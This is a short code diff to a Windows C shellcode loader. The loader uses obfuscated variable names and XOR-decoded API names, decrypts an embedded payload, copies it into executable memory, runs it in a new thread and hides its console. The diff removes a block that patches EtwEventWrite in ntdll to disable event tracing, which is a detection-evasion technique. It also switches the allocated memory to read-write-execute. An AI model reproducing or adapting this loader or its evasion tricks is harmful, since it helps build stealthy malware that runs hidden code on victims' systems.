@@ -72,16 +72,6 @@ int main(void) {
 	int pido = 0;
         HANDLE hProc = NULL;	
 	
-	void * addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
-        VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
-
-        #ifdef _WIN64
-        memcpy(addr, "\x48\x33\xc0\xc3", 4);            
-        #else
-        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5);                
-        #endif  
-
-        VirtualProtect(addr, 4096, oldprotect, &oldprotect);
 	
 	strrev(Random3);
 	FreeConsole();
@@ -90,7 +80,7 @@ int main(void) {
 	RandomA((char *) Random9, sizeof (Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
         Virt_Alloc= GetProcAddress(GetModuleHandle("kernel32.dll"), Random9);
 
-	Random6_mem = Virt_Alloc(0, Random7_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	Random6_mem = Virt_Alloc(0, Random7_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	Random1((char *) Random3, Random7_len, Random2, sizeof(Random2));
 		
@@ -98,7 +88,7 @@ int main(void) {
 	RtlMoveMemory(Random6_mem, Random3, Random7_len);
 	
 
-	Random8 = VirtualProtect(Random6_mem, Random7_len, PAGE_EXECUTE_READ, &oldprotect);
+	Random8 = VirtualProtect(Random6_mem, Random7_len, PAGE_EXECUTE_READWRITE, &oldprotect);
 
 	if ( Random8 != 0 ) {
 			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Random6_mem, 0, 0, 0);
